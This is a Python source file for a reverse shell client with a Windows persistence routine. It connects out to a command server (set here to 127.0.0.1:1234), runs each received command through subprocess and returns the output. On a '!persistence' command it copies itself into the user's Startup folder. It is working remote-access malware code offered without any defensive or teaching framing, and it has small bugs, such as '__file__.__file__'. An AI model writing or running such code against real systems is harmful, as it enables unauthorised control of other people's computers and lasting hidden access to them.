import socket
import os
import subprocess
import sys
import shutil


def main():
    server_host = "127.0.0.1"  # sys.argv[1]
    server_port = 1234  # sys.argv[2]
    buffer_size = 1024 * 256  # 256 KB per message

    seperator = "<br>"

    # Creating Socket
    s = socket.socket()
    # Connecting to server socket
    s.connect((server_host, server_port))

    # Get Current Directory
    cwd = os.getcwd()
    send_msg(s, cwd)

    while True:
        # receive the command from the server
        command = s.recv(buffer_size).decode()
        split_command = command.split()
        output = ""
        if command.lower() == "exit":  # if the command is exit, break loop
            break
        elif split_command[0].lower() == "cd":  # cd command, change directory
            try:
                os.chdir(' '.join(split_command[1:]))
            except FileNotFoundError as e:  # if there is an error, set as the output
                output = str(e)
            else:  # if operation is successful, empty message
                output = ""
        elif split_command[0].lower() == "!persistence":  # if command is !persistence, install as regex run on startup
            persistence()
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        msg = f"{output}{seperator}{cwd}"
        send_msg(s, msg)

    # close client connection
    s.close()


def send_msg(client_socket, msg):
    client_socket.send(msg.encode())


def persistence():
    old_location = __file__.__file__
    new_location = "C:\\Users\\" + os.getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Programs" \
                                                   "\\Startup\\client.py"
    shutil.copyfile(old_location, new_location)


if __name__ == "__main__":
    main()
